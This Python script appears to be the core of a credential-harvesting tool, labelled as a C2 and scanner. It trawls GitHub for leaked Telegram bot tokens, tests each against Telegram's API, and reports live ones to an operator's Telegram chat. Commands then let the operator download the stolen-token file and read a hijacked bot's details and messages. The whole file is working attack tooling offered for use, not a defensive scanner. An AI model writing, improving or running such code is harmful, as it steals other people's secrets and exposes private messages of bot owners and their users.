import os
import requests
import threading
import time
import telebot
from scanner import search_for_tokens
from controller import get_bot_info, get_bot_messages

GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
FOUND_FILE = "found.txt"

bot = telebot.TeleBot(BOT_TOKEN)

# --- نظام التحكم (C2) ---
@bot.message_handler(commands=['get_tokens'])
def send_tokens(message):
    if str(message.chat.id) == CHAT_ID:
        if os.path.exists(FOUND_FILE):
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "⚠️ الملف فارغ.")

@bot.message_handler(commands=['info'])
def cmd_info(message):
    if str(message.chat.id) == CHAT_ID:
        token = message.text.split()[1] if len(message.text.split()) > 1 else None
        if token:
            bot.reply_to(message, f"📋 Info:\n{get_bot_info(token)}")

@bot.message_handler(commands=['messages'])
def cmd_messages(message):
    if str(message.chat.id) == CHAT_ID:
        token = message.text.split()[1] if len(message.text.split()) > 1 else None
        if token:
            bot.reply_to(message, f"📩 Messages:\n{get_bot_messages(token)}")

# --- نظام المسح (Scanner) ---
def is_already_found(token):
    if not os.path.exists(FOUND_FILE): return False
    with open(FOUND_FILE, "r") as f:
        return token in f.read()

def mark_as_found(token):
    with open(FOUND_FILE, "a") as f:
        f.write(token + "\n")

def process_token(token):
    check_url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        if requests.get(check_url, timeout=5).status_code == 200:
            if not is_already_found(token):
                bot.send_message(CHAT_ID, f"✅ توكن فعال:\n`{token}`", parse_mode="Markdown")
                mark_as_found(token)
    except: pass

def run_scanner():
    print("Zero Engine: Scanner Active...")
    while True:
        tokens = search_for_tokens(GITHUB_TOKEN)
        for token in tokens:
            threading.Thread(target=process_token, args=(token,)).start()
        time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=bot.infinity_polling).start()
    run_scanner()
